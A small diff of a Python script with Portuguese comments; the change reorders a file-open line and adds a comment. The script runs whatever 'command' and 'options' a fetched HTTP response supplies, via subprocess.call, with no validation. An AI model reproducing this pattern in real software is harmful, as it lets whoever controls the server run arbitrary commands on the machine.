@@ -15,10 +15,11 @@ if request_response.status_code != 200:
     print("Request status code is not 200. Exiting.")
     sys.exit(1)
 
+#Decodificar JSON
 decoded_command = json.loads(request_response.text)
-output_file = open(OUTPUT_FILENAME, 'w')
 
 #Executar comando
+output_file = open(OUTPUT_FILENAME, 'w')
 subprocess.call([decoded_command['command'], decoded_command['options']], stdout=output_file)
 output_file.close()
 
